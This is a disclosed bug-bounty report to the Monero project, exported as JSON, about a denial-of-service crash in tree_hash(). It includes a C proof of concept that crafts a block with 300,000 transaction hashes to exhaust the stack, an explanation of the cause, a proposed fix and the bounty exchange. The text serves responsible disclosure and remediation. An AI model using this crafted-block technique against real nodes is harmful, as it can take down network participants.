{"id":519120,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTkxMjA=","url":"https://hackerone.com/reports/519120","title":"Computing hash of crafted block leads to crash in tree_hash()","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-03-30T20:31:23.902Z","submitted_at":"2019-03-30T20:31:23.902Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"guido","url":"/guido","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7731,"url":"https://hackerone.com/monero","handle":"monero","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Monero","twitter_handle":"monero","website":"https://getmonero.org","about":" Monero: the secure, private, untraceable cryptocurrency"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-07-03T00:11:28.656Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-03T00:02:04.731Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC:\n\n```c\n#include \u003ccryptonote_basic/cryptonote_format_utils.h\u003e\n\nint main(void)\n{\n    cryptonote::block b = AUTO_VAL_INIT(b);\n    for (size_t i = 0; i \u003c 300000; i++) {\n        b.tx_hashes.push_back({});\n    }\n    std::ostringstream oss;\n    binary_archive\u003ctrue\u003e ba(oss);\n    std::string s;\n    if ( ::serialization::serialize(ba, b) == true ) {\n        s = oss.str();\n    } else {\n        return 0;\n    }\n\n/* Uncomment to crash */\n    cryptonote::block b2 = AUTO_VAL_INIT(b2);\n    if ( parse_and_validate_block_from_blob(s, b2) == true ) {\n        /* Crash */\n        get_tx_tree_hash(b2);\n    }\n    return 0;\n}\n```\n\nThe reason this crashes is because of this code in ```tree_hash```:\n\n```c\n    char ints[cnt][HASH_SIZE];\n    memset(ints, 0 , sizeof(ints));  // zero out as extra protection for using uninitialized mem\n```\n\n```ints``` is allocated on the stack, not on the heap. Its size is dynamic; ```cnt``` (derived from the number of ```tx_hashes``` in this example) multiplied by 32 (```HASH_SIZE```) is the amount of bytes reserved on the stack.\n\nOn a typical, modern 64 bit OS, the stack is usually 8MB in size. Hence, a sufficient amount of ```tx_hashes``` will cause more stack to be reserved than is available.\nTechnically, the reservation of the stack space doesn't cause the crash (this only alters the stack pointer), but the subsequent ```memset``` does.\n\nNote that the serialized size of a block with 300000 tx_hashes is about 9 MB (see ```s.size()```), which is well within the limits of ```CRYPTONOTE_MAX_BLOCK_SIZE``` (500MB).\n\nThe best remediation to this issue is to use allocate memory on the heap, not the stack.\n\n## Impact\n\nCrash nodes","vulnerability_information_html":"\u003cp\u003eI\u0026#39;m not sure how to test this against against an actual Monero instance, so I\u0026#39;m instead showing an isolated PoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e#include \u0026lt;cryptonote_basic/cryptonote_format_utils.h\u0026gt;\n\u003c/span\u003e\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecryptonote\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eblock\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAUTO_VAL_INIT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e300000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etx_hashes\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epush_back\u003c/span\u003e\u003cspan class=\"p\"\u003e({});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eostringstream\u003c/span\u003e \u003cspan class=\"n\"\u003eoss\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebinary_archive\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eba\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoss\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estd\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eserialization\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eba\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eoss\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"cm\"\u003e/* Uncomment to crash */\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ecryptonote\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"n\"\u003eblock\u003c/span\u003e \u003cspan class=\"n\"\u003eb2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eAUTO_VAL_INIT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eb2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003eparse_and_validate_block_from_blob\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"cm\"\u003e/* Crash */\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eget_tx_tree_hash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eb2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe reason this crashes is because of this code in \u003ccode\u003etree_hash\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e    \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"n\"\u003eints\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ecnt\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"n\"\u003eHASH_SIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ememset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eints\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eints\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e  \u003cspan class=\"c1\"\u003e// zero out as extra protection for using uninitialized mem\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eints\u003c/code\u003e is allocated on the stack, not on the heap. Its size is dynamic; \u003ccode\u003ecnt\u003c/code\u003e (derived from the number of \u003ccode\u003etx_hashes\u003c/code\u003e in this example) multiplied by 32 (\u003ccode\u003eHASH_SIZE\u003c/code\u003e) is the amount of bytes reserved on the stack.\u003c/p\u003e\n\n\u003cp\u003eOn a typical, modern 64 bit OS, the stack is usually 8MB in size. Hence, a sufficient amount of \u003ccode\u003etx_hashes\u003c/code\u003e will cause more stack to be reserved than is available.\u003cbr\u003e\nTechnically, the reservation of the stack space doesn\u0026#39;t cause the crash (this only alters the stack pointer), but the subsequent \u003ccode\u003ememset\u003c/code\u003e does.\u003c/p\u003e\n\n\u003cp\u003eNote that the serialized size of a block with 300000 tx_hashes is about 9 MB (see \u003ccode\u003es.size()\u003c/code\u003e), which is well within the limits of \u003ccode\u003eCRYPTONOTE_MAX_BLOCK_SIZE\u003c/code\u003e (500MB).\u003c/p\u003e\n\n\u003cp\u003eThe best remediation to this issue is to use allocate memory on the heap, not the stack.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eCrash nodes\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-02T00:02:04.855Z","allow_singular_disclosure_after":-44518318.81308877,"singular_disclosure_allowed":true,"vote_count":7,"voters":["m7mdharoun","tems","armansameer","anomalroil","who-biz","bobo451","devsec_nate"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4426398,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Related:\n\nI would use\n\n```c\nmemset(ints, 0 , cnt * HASH_SIZE);\n```\n\ninstead of \n```c\nmemset(ints, 0 , sizeof(ints));\n```\n\nand I would change the asserts in ```tree_hash_cnt``` to exception throws just in case someone manages to reach this code with a tx_hashes size of ```0x10000000```:\n\n```c\nsize_t tree_hash_cnt(size_t count) {\n    // This algo has some bad history but all we are doing is 1 \u003c\u003c floor(log2(count))\n    // There are _many_ ways to do log2, for some reason the one selected was the most obscure one,\n    // and fixing it made it even more obscure.\n    //  \n    // Iterative method implemented below aims for clarity over speed, if performance is needed\n    // then my advice is to use the BSR instruction on x86\n    //  \n    // All the paranoid asserts have been removed since it is trivial to mathematically prove that\n    // the return will always be a power of 2.\n    // Problem space has been defined as 3 \u003c= count \u003c= 2^28. Of course quarter of a billion transactions\n    // is not a sane upper limit for a block, so there will be tighter limits in other parts of the code\n\n    assert( count \u003e= 3 ); // cases for 0,1,2 are handled elsewhere\n    assert( count \u003c= 0x10000000 ); // sanity limit to 2^28, MSB=1 will cause an inf loop\n\n    size_t pow = 2;\n    while(pow \u003c count) pow \u003c\u003c= 1;\n    return pow \u003e\u003e 1;\n}\n```","markdown_message":"\u003cp\u003eRelated:\u003c/p\u003e\n\n\u003cp\u003eI would use\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ememset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eints\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecnt\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eHASH_SIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003einstead of \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ememset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eints\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eints\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand I would change the asserts in \u003ccode\u003etree_hash_cnt\u003c/code\u003e to exception throws just in case someone manages to reach this code with a tx_hashes size of \u003ccode\u003e0x10000000\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"nf\"\u003etree_hash_cnt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003ecount\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// This algo has some bad history but all we are doing is 1 \u0026lt;\u0026lt; floor(log2(count))\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// There are _many_ ways to do log2, for some reason the one selected was the most obscure one,\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// and fixing it made it even more obscure.\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//  \u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Iterative method implemented below aims for clarity over speed, if performance is needed\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// then my advice is to use the BSR instruction on x86\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e//  \u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// All the paranoid asserts have been removed since it is trivial to mathematically prove that\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// the return will always be a power of 2.\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// Problem space has been defined as 3 \u0026lt;= count \u0026lt;= 2^28. Of course quarter of a billion transactions\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// is not a sane upper limit for a block, so there will be tighter limits in other parts of the code\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003eassert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// cases for 0,1,2 are handled elsewhere\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eassert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x10000000\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// sanity limit to 2^28, MSB=1 will cause an inf loop\u003c/span\u003e\n\n    \u003cspan class=\"kt\"\u003esize_t\u003c/span\u003e \u003cspan class=\"n\"\u003epow\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epow\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003ecount\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003epow\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003epow\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-03-30T20:36:49.360Z","updated_at":"2019-03-30T20:36:49.360Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4438665,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-01T23:04:12.142Z","updated_at":"2019-04-01T23:04:12.142Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4466771,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Nice. Easy to fix too. Thanks.","markdown_message":"\u003cp\u003eNice. Easy to fix too. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-03T21:51:12.961Z","updated_at":"2019-04-03T21:51:12.961Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4675383,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you please proceed to rewarding this report please? Both the bug and the fix are evident.\n\n48XB817vPzmEhwEGvw5zcLSnT1aRMBbN1jQUnUXMLpoyJE7jgXpdPsUNYgXg3ddcKbA2u3wpGqmHhT3DbTZCMjmV6vSY3bt\n\nThanks\n","markdown_message":"\u003cp\u003eCan you please proceed to rewarding this report please? Both the bug and the fix are evident.\u003c/p\u003e\n\n\u003cp\u003e48XB817vPzmEhwEGvw5zcLSnT1aRMBbN1jQUnUXMLpoyJE7jgXpdPsUNYgXg3ddcKbA2u3wpGqmHhT3DbTZCMjmV6vSY3bt\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-29T23:45:39.162Z","updated_at":"2019-04-29T23:45:39.162Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4677821,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, we will respond soon.","markdown_message":"\u003cp\u003eYes, we will respond soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T01:10:25.781Z","updated_at":"2019-04-30T01:10:25.781Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4693509,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sent 2 XMR: \u003ca1d21945bb6097004795fbb00760ec9a9a8649f9830dd73adefee518dad64dd1\u003e","markdown_message":"\u003cp\u003eSent 2 XMR: \u0026lt;a1d21945bb6097004795fbb00760ec9a9a8649f9830dd73adefee518dad64dd1\u0026gt;\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T20:12:58.627Z","updated_at":"2019-04-30T20:12:58.627Z","actor":{"username":"luigi1111w","cleared":false,"url":"/luigi1111w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4694013,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-30T20:22:33.709Z","updated_at":"2019-04-30T20:22:33.709Z","actor":{"url":"/monero","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Monero"}},"reporter":{"username":"guido","url":"/guido"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4694015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. Why 2 XMR and some others 10 XMR?","markdown_message":"\u003cp\u003eThanks. Why 2 XMR and some others 10 XMR?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-30T20:22:58.653Z","updated_at":"2019-04-30T20:22:58.653Z","actor":{"username":"guido","cleared":false,"url":"/guido","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4694016,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-30T20:23:00.654Z","updated_at":"2019-04-30T20:23:00.654Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"guido","url":"/guido"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4694420,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @guido.\n\nThe decision for bounty reward was based on the following factors:\n\n1. As always, with any report, bounty amount is subjectively distributed based on both the criteria of severity and the percentage of bounty available per severity. This report was considered `LOW` severity but, of course, it was very helpful and appreciated. \n2. As noted in our VRP: `DoS's which do not crash a node remotely will receive a lower bounty reward` so,since you've stated `I'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC`,  we cannot release larger bounty at this time (for this report).\n\nPlease continue your great work, we are very appreciative of your efforts and reports.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/guido\"\u003e@guido\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe decision for bounty reward was based on the following factors:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAs always, with any report, bounty amount is subjectively distributed based on both the criteria of severity and the percentage of bounty available per severity. This report was considered \u003ccode\u003eLOW\u003c/code\u003e severity but, of course, it was very helpful and appreciated. \u003c/li\u003e\n\u003cli\u003eAs noted in our VRP: \u003ccode\u003eDoS\u0026#39;s which do not crash a node remotely will receive a lower bounty reward\u003c/code\u003e so,since you\u0026#39;ve stated \u003ccode\u003eI\u0026#39;m not sure how to test this against against an actual Monero instance, so I\u0026#39;m instead showing an isolated PoC\u003c/code\u003e,  we cannot release larger bounty at this time (for this report).\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePlease continue your great work, we are very appreciative of your efforts and 